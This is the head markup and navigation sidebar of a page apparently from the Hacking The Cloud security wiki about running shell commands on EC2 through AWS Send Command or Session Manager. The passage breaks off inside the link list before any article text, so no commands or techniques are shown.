<!DOCTYPE html><html lang="en" class="no-js"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Leverage privileged access in an AWS account to run arbitrary commands on an EC2 instance."><link href="https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/" rel="canonical"><link href="../role-chain-juggling/" rel="prev"><link href="../s3_acl_persistence/" rel="next"><link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../feed_rss_created.xml"><link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../feed_rss_updated.xml"><link rel="icon" href="../../../assets/favicon.png"><meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0+insiders-4.53.17"><title>Run Shell Commands on EC2 with Send Command or Session Manager - Hacking The Cloud</title><link rel="stylesheet" href="../../../assets/stylesheets/main.22cc1d52.min.css"><link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel="stylesheet" href="../../../stylesheets/extra.css"><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><meta property="og:type" content="website"><meta property="og:title" content="Run Shell Commands on EC2 with Send Command or Session Manager - Hacking The Cloud"><meta property="og:description" content="Leverage privileged access in an AWS account to run arbitrary commands on an EC2 instance."><meta property="og:image" content="https://hackingthe.cloud/assets/images/social/aws/post_exploitation/run_shell_commands_on_ec2.png"><meta property="og:image:type" content="image/png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta content="https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/" property="og:url"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:title" content="Run Shell Commands on EC2 with Send Command or Session Manager - Hacking The Cloud"><meta property="twitter:description" content="Leverage privileged access in an AWS account to run arbitrary commands on an EC2 instance."><meta property="twitter:image" content="https://hackingthe.cloud/assets/images/social/aws/post_exploitation/run_shell_commands_on_ec2.png"><link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style></head> <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="indigo"> <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off"> <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off"> <label class="md-overlay" for="__drawer"></label> <div data-md-component="skip"> <a href="#send-command" class="md-skip"> Skip to content </a> </div> <div data-md-component="announce"> <aside class="md-banner"> <div class="md-banner__inner md-grid md-typeset"> The CFP for <a rel="me" href="https://fwdcloudsec.org/conference/north-america/cfp.html"> <strong>fwd:cloudsec NA 2026</strong> </a> is open now! This is your opportunity to speak at the best cloud security conference on earth! </div> </aside> </div> <header class="md-header" data-md-component="header"> <nav class="md-header__inner md-grid" aria-label="Header"> <a href="../../.." title="Hacking The Cloud" class="md-header__button md-logo" aria-label="Hacking The Cloud" data-md-component="logo"> <img src="../../../assets/logo.png" alt="logo"> </a> <label class="md-header__button md-icon" for="__drawer"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg> </label> <div class="md-header__title" data-md-component="header-title"> <div class="md-header__ellipsis"> <div class="md-header__topic"> <span class="md-ellipsis"> Hacking The Cloud </span> </div> <div class="md-header__topic" data-md-component="header-topic"> <span class="md-ellipsis"> Run Shell Commands on EC2 with Send Command or Session Manager </span> </div> </div> </div> <form class="md-header__option" data-md-component="palette"> <input class="md-option" data-md-color-media data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="indigo" aria-label="Switch to Dark Mode" type="radio" name="__palette" id="__palette_0"> <label class="md-header__button md-icon" title="Switch to Dark Mode" for="__palette_1" hidden> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"></path></svg> </label> <input class="md-option" data-md-color-media data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="indigo" aria-label="Switch to Light Mode" type="radio" name="__palette" id="__palette_1"> <label class="md-header__button md-icon" title="Switch to Light Mode" for="__palette_0" hidden> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"></path></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for="__search"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg> </label> <div class="md-search" data-md-component="search" role="dialog"> <label class="md-search__overlay" for="__search"></label> <div class="md-search__inner" role="search"> <form class="md-search__form" name="search"> <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required> <label class="md-search__icon md-icon" for="__search"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg> </label> <nav class="md-search__options" aria-label="Search"> <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg> </button> </nav> </form> <div class="md-search__output"> <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix> <div class="md-search-result" data-md-component="search-result"> <div class="md-search-result__meta"> Initializing search </div> <ol class="md-search-result__list" role="presentation"></ol> </div> </div> </div> </div> </div> <div class="md-header__source"> <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud" title="Go to repository" class="md-source" data-md-component="source"> <div class="md-source__icon md-icon"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg> </div> <div class="md-source__repository"> Hacking The Cloud </div> </a> </div> </nav> </header> <div class="md-container" data-md-component="container"> <nav class="md-tabs" aria-label="Tabs" data-md-component="tabs"> <div class="md-grid"> <ul class="md-tabs__list"> <li class="md-tabs__item"> <a href="../../.." class="md-tabs__link"> Hacking The Cloud </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href="../../general-knowledge/aws_cli_tips_and_tricks/" class="md-tabs__link"> AWS </a> </li> <li class="md-tabs__item"> <a href="../../../azure/abusing-managed-identities/" class="md-tabs__link"> Azure </a> </li> <li class="md-tabs__item"> <a href="../../../gcp/general-knowledge/default-account-names/" class="md-tabs__link"> GCP </a> </li> <li class="md-tabs__item"> <a href="../../../ai-llm/exploitation/claude_magic_string_denial_of_service/" class="md-tabs__link"> AI and LLM </a> </li> <li class="md-tabs__item"> <a href="../../../terraform/terraform_ansi_escape_evasion/" class="md-tabs__link"> Terraform </a> </li> <li class="md-tabs__item"> <a href="../../../blog/call_for_ai_research/" class="md-tabs__link"> Blog </a> </li> </ul> </div> </nav> <main class="md-main" data-md-component="main"> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0"> <label class="md-nav__title" for="__drawer"> <a href="../../.." title="Hacking The Cloud" class="md-nav__button md-logo" aria-label="Hacking The Cloud" data-md-component="logo"> <img src="../../../assets/logo.png" alt="logo"> </a> Hacking The Cloud </label> <div class="md-nav__source"> <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud" title="Go to repository" class="md-source" data-md-component="source"> <div class="md-source__icon md-icon"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg> </div> <div class="md-source__repository"> Hacking The Cloud </div> </a> </div> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../.." class="md-nav__link"> <span class="md-ellipsis"> Hacking The Cloud </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked> <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex> <span class="md-ellipsis"> AWS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true"> <label class="md-nav__title" for="__nav_2"> <span class="md-nav__icon md-icon"></span> AWS </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1"> <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0"> <span class="md-ellipsis"> General Knowledge </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_1"> <span class="md-nav__icon md-icon"></span> General Knowledge </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../general-knowledge/aws_cli_tips_and_tricks/" class="md-nav__link"> <span class="md-ellipsis"> AWS CLI Tips and Tricks </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/aws_organizations_defaults/" class="md-nav__link"> <span class="md-ellipsis"> AWS Organizations Defaults &amp; Pivoting </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/block-expensive-actions-with-scps/" class="md-nav__link"> <span class="md-ellipsis"> Prevent Expensive AWS API Actions with SCPs </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/connection-tracking/" class="md-nav__link"> <span class="md-ellipsis"> Connection Tracking </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/iam-key-identifiers/" class="md-nav__link"> <span class="md-ellipsis"> IAM unique identifiers </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/intro_metadata_service/" class="md-nav__link"> <span class="md-ellipsis"> Introduction to the Instance Metadata Service </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/introduction_user_data/" class="md-nav__link"> <span class="md-ellipsis"> Introduction to User Data </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/using_stolen_iam_credentials/" class="md-nav__link"> <span class="md-ellipsis"> Using Stolen IAM Credentials </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/" class="md-nav__link"> <span class="md-ellipsis"> Why Recreating an IAM Role Doesn't Restore Trust: A Gotcha in Role ARNs </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2"> <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0"> <span class="md-ellipsis"> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_2"> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../enumeration/account_id_from_ec2/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate AWS Account ID from an EC2 Instance </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/account_id_from_s3_bucket/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate AWS Account ID from a Public S3 Bucket </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/brute_force_iam_permissions/" class="md-nav__link"> <span class="md-ellipsis"> Brute Force IAM Permissions </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/bypass_cognito_user_enumeration_controls/" class="md-nav__link"> <span class="md-ellipsis"> Bypass Cognito Account Enumeration Controls </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/discover_secrets_in_public_aims/" class="md-nav__link"> <span class="md-ellipsis"> Discover secrets in public AMIs </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enum_iam_user_role/" class="md-nav__link"> <span class="md-ellipsis"> Unauthenticated Enumeration of IAM Users and Roles </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enumerate_principal_arn_from_unique_id/" class="md-nav__link"> <span class="md-ellipsis"> Derive a Principal ARN from an AWS Unique Identifier </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enumerate_root_email_from_console/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate Root User Email Address from the AWS Console </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enumerate_services_via_aws_backup/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate services via AWS Backup </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/get-account-id-from-keys/" class="md-nav__link"> <span class="md-ellipsis"> Get Account ID from AWS Access Keys </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/loot_public_ebs_snapshots/" class="md-nav__link"> <span class="md-ellipsis"> Loot Public EBS Snapshots </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/whoami/" class="md-nav__link"> <span class="md-ellipsis"> Whoami - Get Principal Name From Keys </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3"> <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0"> <span class="md-ellipsis"> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_3"> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../exploitation/abusing-container-registry/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Elastic Container Registry for Lateral Movement </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/cognito_identity_pool_excessive_privileges/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Overpermissioned AWS Cognito Identity Pools </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/cognito_user_self_signup/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Unintended Self-Signup in AWS Cognito </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/ec2-metadata-ssrf/" class="md-nav__link"> <span class="md-ellipsis"> Steal EC2 Metadata Credentials via SSRF </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/iam_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> AWS IAM Privilege Escalation Techniques </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/lambda-steal-iam-credentials/" class="md-nav__link"> <span class="md-ellipsis"> Steal IAM Credentials and Event Data from Lambda </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/local_ec2_priv_esc_through_user_data/" class="md-nav__link"> <span class="md-ellipsis"> EC2 Privilege Escalation Through User Data </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/orphaned_cloudfront_or_dns_takeover_via_s3/" class="md-nav__link"> <span class="md-ellipsis"> DNS and CloudFront Domain Takeover via Deleted S3 Buckets </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/route53_modification_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> AWS API Call Hijacking via ACM-PCA </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/s3-bucket-replication-exfiltration/" class="md-nav__link"> <span class="md-ellipsis"> Exfiltrating S3 Data with Bucket Replication Policies </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/s3_server_access_logs/" class="md-nav__link"> <span class="md-ellipsis"> Data Exfiltration through S3 Server Access Logs </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/s3_streaming_copy/" class="md-nav__link"> <span class="md-ellipsis"> S3 Streaming Copy </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_13"> <div class="md-nav__link md-nav__container"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/" class="md-nav__link "> <span class="md-ellipsis"> Misconfigured Resource Based Policies </span> </a> <label class="md-nav__link " for="__nav_2_3_13" id="__nav_2_3_13_label" tabindex="0"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_13_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_3_13"> <span class="md-nav__icon md-icon"></span> Misconfigured Resource Based Policies </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/" class="md-nav__link"> <span class="md-ellipsis"> CVE-2024-28056: Exploit an AWS Amplify Vulnerability in Same-Account Scenarios </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/" class="md-nav__link"> <span class="md-ellipsis"> Exploiting Misconfigured GitLab OIDC AWS IAM Roles </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/" class="md-nav__link"> <span class="md-ellipsis"> Exploiting Misconfigured Terraform Cloud OIDC AWS IAM Roles </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/" class="md-nav__link"> <span class="md-ellipsis"> Exploiting Public AWS Resources Programmatically - The Playbook </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Misconfigured ECR Resource Policies </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/misconfigured_iam_role_trust_policy_wildcard_principal/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Misconfigured Role Trust Policies with a Wildcard Principal </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4"> <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0"> <span class="md-ellipsis"> Avoid Detection </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_4"> <span class="md-nav__icon md-icon"></span> Avoid Detection </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../avoiding-detection/guardduty-pentest/" class="md-nav__link"> <span class="md-ellipsis"> Bypass GuardDuty Pentest Findings for the AWS CLI </span> </a> </li> <li class="md-nav__item"> <a href="../../avoiding-detection/guardduty-tor-client/" class="md-nav__link"> <span class="md-ellipsis"> Bypass GuardDuty Tor Client Findings </span> </a> </li> <li class="md-nav__item"> <a href="../../avoiding-detection/modify-guardduty-config/" class="md-nav__link"> <span class="md-ellipsis"> Modify GuardDuty Configuration </span> </a> </li> <li class="md-nav__item"> <a href="../../avoiding-detection/steal-keys-undetected/" class="md-nav__link"> <span class="md-ellipsis"> Bypass Credential Exfiltration Detection </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" checked> <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0"> <span class="md-ellipsis"> Post Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="true"> <label class="md-nav__title" for="__nav_2_5"> <span class="md-nav__icon md-icon"></span> Post Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../codebuild_github_runner_persistence/" class="md-nav__link"> <span class="md-ellipsis"> AWS CodeBuild GitHub Runner Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../create_a_console_session_from_iam_credentials/" class="md-nav__link"> <span class="md-ellipsis"> Create a Console Session from IAM Credentials </span> </a> </li> <li class="md-nav__item"> <a href="../download_tools_and_exfiltrate_data_with_aws_cli/" class="md-nav__link"> <span class="md-ellipsis"> Download Tools and Exfiltrate Data with the AWS CLI </span> </a> </li> <li class="md-nav__item"> <a href="../get_iam_creds_from_console_session/" class="md-nav__link"> <span class="md-ellipsis"> Get IAM Credentials from a Console Session </span> </a> </li> <li class="md-nav__item"> <a href="../iam_persistence/" class="md-nav__link"> <span class="md-ellipsis"> AWS IAM Persistence Methods </span> </a> </li> <li class="md-nav__item"> <a href="../iam_persistence_eventual_consistency/" class="md-nav__link"> <span class="md-ellipsis"> IAM Persistence through Eventual Consistency </span> </a> </li> <li class="md-nav__item"> <a href="../iam_rogue_oidc_identity_provider/" class="md-nav__link"> <span class="md-ellipsis"> IAM Rogue OIDC Identity Provider Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../iam_roles_anywhere_persistence/" class="md-nav__link"> <span class="md-ellipsis"> IAM Roles Anywhere Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../intercept_ssm_communications/" class="md-nav__link"> <span class="md-ellipsis"> Intercept SSM Communications </span> </a> </li> <li class="md-nav__item"> <a href="../lambda_persistence/" class="md-nav__link"> <span class="md-ellipsis"> Lambda Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../network-firewall-egress-filtering-bypass/" class="md-nav__link"> <span class="md-ellipsis"> AWS Network Firewall Egress Filtering Bypass </span> </a> </li> <li class="md-nav__item"> <a href="../role-chain-juggling/" class="md-nav__link"> <span class="md-ellipsis"> Role Chain Juggling </span> </a> </li> <li class="md-nav__item 